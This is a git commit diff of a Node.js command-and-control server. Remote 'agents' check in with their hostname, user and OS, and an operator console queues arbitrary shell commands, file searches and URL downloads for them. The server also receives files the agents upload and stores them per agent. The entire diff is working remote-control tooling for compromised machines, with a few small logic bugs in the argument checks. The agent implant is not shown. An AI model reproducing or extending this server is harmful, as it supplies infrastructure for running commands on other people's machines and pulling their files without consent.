674098580d367f2f15e77168adfe8ddec2affaab
Brett Heinkel <bheinks@gmail.com>
2019-05-02 23:35:16 -0500

    Create agent class, refactor prompt, use hashing function for calculating agent ID

---
+++ server/agent.js
@@ -0,0 +1,33 @@
+const crypto = require('crypto');
+
+module.exports = class Agent {
+  constructor({hostname, user, os}) {
+    this.hostname = hostname;
+    this.user = user;
+    this.os = os;
+
+    this.lastContacted = new Date();
+    this.commands = []
+    this.id = (
+      crypto.createHash('sha1').update(hostname + user + os).digest('hex').slice(0, 5)
+    );
+  }
+
+  queueCommand(command) {
+    this.commands.push(command);
+  }
+
+  getCommand() {
+    return this.commands.pop();
+  }
+
+  toJSON() {
+    return {
+      hostname: this.hostname,
+      user: this.user,
+      os: this.os,
+      id: this.id,
+      lastContacted: this.lastContacted,
+    }
+  }
+}
--- server/server.js
+++ server/server.js
@@ -1,14 +1,15 @@
+const readline = require('readline');
 const express = require('express');
 const bodyParser = require('body-parser');
 const fileUpload = require('express-fileupload');
 const process = require('process');
 const events = require('events');
 const fs = require('fs');
+const crypto = require('crypto');
 
 // local imports
-const prompt = require('./prompt');
+const Agent = require('./agent');
 
-const eventEmitter = new events.EventEmitter();
 const app = express();
 
 const PORT = 3000;
@@ -19,12 +20,159 @@ const agents = {}; // connected agents
 
 // ---------- helper functions ---------- //
 
-function log(info) {
-  console.log('\x1b[32m%s\x1b[0m', output);
+function success(info) {
+  console.log('\x1b[32m%s\x1b[0m', info);
 }
 
 function error(info) {
   console.log('\x1b[31m%s\x1b[0m', info);
+}
+
+// ---------- initialize prompt ---------- //
+
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+  /*completer: line => {
+    const command = line.trim().split(' ');
+
+    let completions = [];
+    let commands = 'agent exit'.split(' ');
+    let agentCommands = 'list cmd disconnect find time download'.split(' ');
+
+    if (line == '') {
+      completions = commands;
+    } else if (line == 'agent') {
+      completions = agentCommands;
+    } else if (agentCommands.includes(line)) {
+      completions = Object.keys(agents);
+      console.log(completions);
+    }
+
+    const hits = completions.filter((c) => c.startsWith(line));
+    
+    return [hits.length ? hits : completions, line];
+  },*/
+});
+
+rl.setPrompt('> ');
+rl.on('line', line => {
+  // split line into command and arguments, filtering out empty strings
+  let [cmd, ...args] = line.split(' ').filter(l => l.length != 0);
+
+  switch (cmd) {
+    case 'agent':
+      let id = args[1];
+
+      switch(args[0]) {
+        case 'list':
+          listAgents();
+          break;
+
+        case 'cmd':
+          const command = args.slice(2);
+          if (id == undefined || cmd.length == 0) {
+            console.log('Usage: agent cmd <ID> <command>');
+          } else if (id in agents) {
+            sendCommand(id, command.join(' '));
+          } else {
+            error('An agent with that ID does not exist');
+          }
+          break;
+
+        case 'disconnect':
+          if (id == undefined) {
+            console.log('Usage: agent disconnect <ID>');
+          } else if (id in agents) {
+            disconnect(id);
+          } else {
+            error('An agent with that ID does not exist');
+          }
+          break;
+
+        case 'find':
+          const fileNames = args.slice(2);
+          if (id == undefined || fileNames.length == 0) {
+            console.log('Usage: agent find <ID> <command>');
+          } else if (id in agents) {
+            find(id, fileNames.join(' '));
+          } else {
+            error('An agent with that ID does not exist');
+          }
+          break;
+
+        case 'time':
+          const seconds = args[2];
+          if (id == undefined || seconds == undefined) {
+            console.log('Usage: agent find <ID> <command>');
+          } else if (id in agents) {
+            setTime(id, seconds);
+          } else {
+            error('An agent with that ID does not exist');
+          }
+          break;
+
+        case 'download':
+          const url = args.slice(2);
+          if (id == undefined || download == undefined) {
+            console.log('Usage: agent download <ID> <url>');
+          } else if (id in agents) {
+            download(id, url);
+          } else {
+            error('An agent with that ID does not exist');
+          }
+          break;
+
+        default:
+          console.log('Usage: agent list\n' +
+                      '       agent cmd <ID> <command>\n' +
+                      '       agent disconnect <ID>\n' +
+                      '       agent find <ID> <command>\n' +
+                      '       agent time <ID> <seconds>\n' +
+                      '       agent download <ID> <url>\n');
+      }
+      break;
+
+    case 'exit':
+      console.log('Shutting down server');
+      process.exit();
+  }
+      
+  rl.prompt();
+});
+
+// ---------- server commands ---------- //
+
+function listAgents() {
+  console.log('Connected agents:');
+  for (let id in agents) {
+    console.log(`Agent ${id}: ${JSON.stringify(agents[id])}`)
+  }
+}
+
+function sendCommand(id, command) {
+  console.log(`Executing ${command} on agent ${id}`);
+  agents[id].queueCommand(`command&${command}`);
+}
+
+function disconnect(id) {
+  console.log(`Issuing disconnect on agent ${id}`);
+  agents[id].queueCommand(`disconnect&`);
+}
+
+function find(id, fileNames) {
+  console.log(`Executing find of ${fileNames} on agent ${id}`);
+  agents[id].queueCommand(`find&find ${fileNames}`);
+}
+
+function setTime(id, seconds) {
+  console.log(`Chainging wait time to ${seconds} on agent ${id}`);
+  agents[id].commands.push(`time&${seconds}`);
+}
+
+function download(id, url) {
+  console.log(`Told agent ${id} to download file with url ${url}`);
+  agents[id].queueCommand(`download&${url}`);
 }
 
 // ---------- express endpoints ---------- //
@@ -34,71 +182,66 @@ app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(fileUpload());
 
-let newId = 0;
 app.post('/connect', (req, res) => {
-  const agent = req.body;
+  const agent = new Agent(req.body);
   const agentJson = JSON.stringify(agent);
-  agent.lastContacted = new Date();
 
-  console.log(`New agent ${agentJson} with ID ${newId}`);
+  success(`New agent ${agentJson}`);
 
   if (!fs.existsSync(CLIENTS_DIRECTORY)) {
     fs.mkdirSync(CLIENTS_DIRECTORY);
   }
 
-  if (!fs.existsSync(`${CLIENTS_DIRECTORY}/${newId}`)) {
-    fs.mkdirSync(`${CLIENTS_DIRECTORY}/${newId}`);
+  if (!fs.existsSync(`${CLIENTS_DIRECTORY}/${agent.id}`)) {
+    fs.mkdirSync(`${CLIENTS_DIRECTORY}/${agent.id}`);
   }
 
-  fs.writeFile(`${CLIENTS_DIRECTORY}/${newId}/client_info.json`, agentJson, (err) => {
+  fs.writeFile(`${CLIENTS_DIRECTORY}/${agent.id}/client_info.json`, agentJson, err => {
     if (err) {
-      console.log("Error saving the file!");
+      error("Error saving the file!");
     }
   });
 
-  agent.commands = [];
-  agents[newId] = agent;
+  agents[agent.id] = agent;
 
-  res.end(newId.toString());
-
-  newId++;
+  //res.json({ id: agent.id });
+  res.end(agent.id);
 });
-
-function disconnect(id) {
-  console.log(`Agent with ID ${id} has disconnected`);
-  delete agents[id];
-}
 
 app.post('/disconnect', (req, res) => {
   const { id } = req.body;
-  disconnect(id);
-  res.end('Successfully disconnected');
+  success(`Agent ${id} has disconnected`);
+  delete agents[id];
+  res.end();
 });
 
 app.post('/command', (req, res) => {
   const { id } = req.body;
-  const agent = agents[id];
-  agent.lastContacted = new Date();
+  let agent = agents[id];
 
-  if (agent.commands.length === 0) {
-    res.end();
-  } else {
-    res.end(agent.commands.pop());
+  if (agent == undefined) {
+    const client_info = `${CLIENTS_DIRECTORY}/${id}/client_info.json`;
+    if (fs.existsSync(client_info)) {
+      agent = new Agent(JSON.parse(fs.readFileSync(client_info)));
+      agents[id] = agent;
+      success(`Agent ${agent.id} successfully reconnected`);
+    } else {
+      error('Agent attempting reconnect not found!');
+      return;
+    }
   }
+
+  agent.lastContacted = new Date();
+  res.end(agent.getCommand());
 });
 
 app.post('/upload', (req, res) => {
   const { file } = req.files;
   const { id } = req.body;
 
-  if (agents[id] == null) {
-    console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
-    return;
-  }
+  success(`Received file from ${id}`);
 
-  console.log(`Received file from ${id}`);
-
-  file.mv(`${CLIENTS_DIRECTORY}/${id}/${file.name}`, (err) => {
+  file.mv(`${CLIENTS_DIRECTORY}/${id}/${file.name}`, err => {
     if (err) {
       return res.status(500).send(err);
     }
@@ -109,130 +252,22 @@ app.post('/upload', (req, res) => {
 
 app.post('/output', (req, res) => {
   const { output } = req.body;
-  console.log('\x1b[32m%s\x1b[0m', output);
+  success(output);
   res.end();
 });
 
 // start server
 app.listen(PORT, () => {
   console.log(`Started on port ${PORT}`);
-
-  // start prompting for user input
-  prompt.start('> ', eventEmitter);
-});
-
-// ---------- event handlers ---------- //
-
-eventEmitter.on('agent', (action, ...args) => {
-  if (action == null) {
-    console.log('Usage: agent list\n' +
-                '       agent cmd <ID> <command>\n' +
-                '       agent disconnect <ID>\n' +
-                '       agent find <ID> <command>\n' +
-                '       agent time <ID> <seconds>\n');
-    return;
-  } 
-
-  action = action.trim();
-
-  if (action === "list") {
-    console.log('Connected agents:');
-    for (let id in agents) {
-      console.log(`Agent ${id}: ${JSON.stringify(agents[id])}`)
-    }
-    console.log();
-  } else if (action === "cmd") {
-    if (args.length === 0) {
-      console.log('Usage: agent cmd <ID> <command>');
-      return;
-    }
-
-
-    const id = args[0];
-    if (agents[id] == null) {
-      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
-      return;
-    }
-
-    const command = args.slice(1).join(' ');
-
-    console.log(`Executing ${command} on agent ${id}`);
-    agents[id].commands.push(`command&${command}`);
-  } else if (action === "disconnect") {
-    if (args.length === 0) {
-      console.log('Usage: agent cmd <ID> <command>');
-      return;
-    }
-
-    const id = args[0];
-    if (agents[id] == null) {
-      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
-      return;
-    }
-
-    console.log(`Disconnecting agent with ID ${id}`);
-    agents[id].commands.push(`disconnect&${id}`);
-  } else if (action === "find") {
-    if(args.length === 0) {
-      console.log('Usage: agent find <ID> <fileName>');
-      return
-    }
-
-    const id = args[0];
-    if (agents[id] == null) {
-      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
-      return;
-    }
-
-    const fileNames = args.slice(1).join(' ');
-
-    console.log(`Executing find of ${fileNames} on agent ${id}`);
-    agents[id].commands.push(`find&find ${fileNames}`);
-  } else if (action === "time") {
-    if(args.length === 0) {
-      console.log('Usage: agent time <ID> <seconds>');
-      return
-    }
-
-    const id = args[0];
-    if (agents[id] == null) {
-      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
-      return;
-    }
-
-    const seconds = args.slice(1).join(' ');
-
-    console.log(`Chainging wait time to ${seconds} on agent ${id}`);
-    agents[id].commands.push(`time&${seconds}`);
-  } else if (action === "download") {
-    if(args.length === 0) {
-      console.log('Usage: agent download <ID> <url>');
-      return
-    }
-
-    const id = args[0];
-    if (agents[id] == null) {
-      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
-      return;
-    }
-
-    const url = args.slice(1).join(' ');
-
-    console.log(`Told agent ${id} to download file with url ${url}`);
-    agents[id].commands.push(`download&${url}`);
-  }
-});
-
-eventEmitter.on('exit', () => {
-  console.log('Shutting down server');
-  process.exit();
+  rl.prompt();
 });
 
 // check every so often that agents are still connected
 setInterval(() => {
   for (let id in agents) {
     if (((new Date()) - agents[id].lastContacted) > CLIENT_TIMEOUT) {
-      disconnect(id);
+      error(`Agent ${id} has timed out`);
+      delete agents[id];
     }
   }
 }, CLIENT_TIMEOUT);
